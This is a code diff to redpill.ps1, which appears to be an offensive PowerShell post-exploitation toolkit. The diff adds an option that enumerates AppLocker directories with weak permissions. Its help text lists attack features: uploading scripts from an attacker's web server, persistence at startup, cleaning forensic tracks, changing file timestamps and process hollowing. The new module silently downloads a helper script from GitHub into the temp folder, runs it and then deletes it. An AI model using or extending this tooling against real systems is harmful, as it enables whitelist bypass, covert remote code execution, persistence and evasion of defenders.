@@ -80,9 +80,11 @@
    [string]$StreamData="false", [int]$Rate='1', [int]$TimeOut='5',
    [int]$BeaconTime='10', [int]$Interval='10', [int]$NewEst='10',
    [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='10',
+   [string]$FolderRigths="false", [string]$UserGroup="false",
    [string]$Extension="false", [string]$FilePath="false",
    [string]$MetaData="false", [int]$ButtonType='0',
    [int]$SPort='8080', [string]$PEHollow="false",
+   [string]$AppLocker="false",
    [string]$Sponsor="false"
 )
 
@@ -154,6 +156,7 @@ $ListParameters = @"
   -Upload           script.ps1           Upload script.ps1 from attacker apache2 webroot
   -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup {BeaconHome}
   -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind {clean system tracks}
+  -AppLocker        Enum                 Enumerate AppLocker Directorys with weak permissions
   -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
   -MetaData         `$Env:TMP\test.exe    Display files \ applications description (metadata)
   -PEHollow         `$Env:TMP\test.exe    PE Process Hollowing {impersonate explorer.exe as parent}
@@ -1872,6 +1875,61 @@ If($PEHollow -ne "false"){
 }
 
 
+if($AppLocker -ieq "Enum"){
+
+   <#
+   .SYNOPSIS
+      Enumerate AppLocker Directorys with weak permissions
+
+   .Parameter FolderRigths
+      Accepts permissions: Read, Write, FullControll
+
+   .Parameter UserGroup
+      Accepts GroupNames: Everyone, BUILTIN\Users, NT AUTHORITY\INTERACTIVE
+
+   .EXAMPLE
+      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -UserGroup "BUILTIN\Users" -FolderRigths "Write"
+      Enumerate AppLocker directorys with 'Write' permissions on 'BUILTIN\Users' Group
+
+   .EXAMPLE
+      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -UserGroup "Everyone" -FolderRigths "FullControl"
+      Enumerate AppLocker directorys with 'FullControl' permissions on 'Everyone' Group
+
+   .OUTPUTS
+      AppLocker Weak Directory permissions
+      ------------------------------------
+
+      VulnId            : 1::ACL (Mitre T1222)
+      FolderPath        : C:\WINDOWS\tracing
+      FileSystemRights  : Write
+      IdentityReference : BUILTIN\Utilizadores
+
+      VulnId            : 2::ACL (Mitre T1222)
+      FolderPath        : C:\WINDOWS\tracing
+      FileSystemRights  : Write
+      IdentityReference : BUILTIN\Utilizadores
+   #>
+
+   ## Download AppLocker.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\AppLocker.ps1")){## Download AppLocker.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,09765625/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+   ## Run auxiliary module
+   powershell -File "$Env:TMP\AppLocker.ps1" -UserGroup "$UserGroup" -FolderRigths "$FolderRigths"
+
+   ## Clean Old files left behind
+   If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
+}
+
+
 ## --------------------------------------------------------------
 ##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
 ## --------------------------------------------------------------
@@ -2897,6 +2955,44 @@ $HelpParameters = @"
       VERBOSE: [+] Allocated memory in the Hollow
       VERBOSE: [+] Rewrote Hollow->PEB->pProcessParameters
       VERBOSE: [+] Created Hollow main thread..
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "AppLocker" -or $Help -ieq "UserGroup" -or $Help -ieq "FolderRigths"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Enumerate AppLocker Directorys with weak permissions
+
+   .Parameter FolderRigths
+      Accepts permissions: Read, Write, FullControll
+
+   .Parameter UserGroup
+      Accepts GroupNames: Everyone, BUILTIN\Users, NT AUTHORITY\INTERACTIVE
+
+   .EXAMPLE
+      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -UserGroup "BUILTIN\Users" -FolderRigths "Write"
+      Enumerate AppLocker directorys with 'Write' permissions on 'BUILTIN\Users' Group
+
+   .EXAMPLE
+      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -UserGroup "Everyone" -FolderRigths "FullControl"
+      Enumerate AppLocker directorys with 'FullControl' permissions on 'Everyone' Group
+
+   .OUTPUTS
+      AppLocker Weak Directory permissions
+      ------------------------------------
+
+      VulnId            : 1::ACL (Mitre T1222)
+      FolderPath        : C:\WINDOWS\tracing
+      FileSystemRights  : Write
+      IdentityReference : BUILTIN\Utilizadores
+
+      VulnId            : 2::ACL (Mitre T1222)
+      FolderPath        : C:\WINDOWS\tracing
+      FileSystemRights  : Write
+      IdentityReference : BUILTIN\Utilizadores
    #>!bye..
 
 "@;
